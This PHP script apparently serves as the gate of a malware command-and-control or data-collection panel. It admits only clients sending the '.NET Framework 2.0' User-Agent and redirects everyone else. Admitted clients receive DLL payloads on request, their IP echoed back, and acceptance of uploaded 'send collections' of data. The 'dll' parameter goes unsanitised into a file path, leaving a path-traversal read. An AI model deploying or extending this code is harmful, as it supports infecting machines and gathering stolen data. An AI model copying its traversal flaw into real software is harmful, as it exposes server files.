<?php 

	require_once ("header.php");
	
	$agent = trim(@$_SERVER['HTTP_USER_AGENT']);
	if($agent != ".NET Framework 2.0") {
		unset($agent);
		header("Location: ".getCurrentHost());
		exit;
	}
	else unset($agent);

	$dll = trim(@$_GET["dll"]);
	if(isset($dll) && strlen($dll)>0){
		$dllPah = "../dll/" . $dll;
		if(file_exists($dllPah)){
			header ("Content-Type: application/x-msdownload");
			header ("Content-Length: ".filesize($dllPah));
			header ('Content-Disposition: attachment; filename="'.$dll.'"');
			header ("Content-Transfer-Encoding: binary");
			header ('Accept-Ranges: bytes');
			echo file_get_contents($dllPah);
			unset($dll); unset($dllPah);
			exit;
		}
		else {
			header("Content-Type: text/plain");
			unset($dll); unset($dllPah);
			exit;
		}
	}
	else unset($test);

	$test = @$_GET["test"];
	if(isset($test) && $test == "true"){
		header("Content-Type: text/plain");
		echo "TEST OK";
		unset($test);
		exit;
	}
	else unset($test);
	
	$ip = @$_GET["ip"];
	if(isset($ip) && $ip == "true"){
		header("Content-Type: text/plain");
		echo @$_SERVER['REMOTE_ADDR'];
		unset($ip);
		exit;
	}
	else unset($ip);	

	$sends = new Sends;
	if(!$sends->isSendCollection()) {
		unset($sends);
		header("Location: ".getCurrentHost());
		exit;
	}
	else{
		$tmpVar = $sends->getSendCollection();
		if(count($tmpVar)>0){
			header("Content-Type: text/plain");
			$tmpVar = $sends->writeCollection($tmpVar);
			if($tmpVar) {
				echo "PROCESS OK";
				unset($sends);
				exit;
			}
			else{
				unset($sends);
				header("Location: ".getCurrentHost());
				exit;
			}
		}
		else{
			unset($sends);
			header("Location: ".getCurrentHost());
			exit;
		}		
	}
	
	header("Location: ".getCurrentHost());
	exit;

?>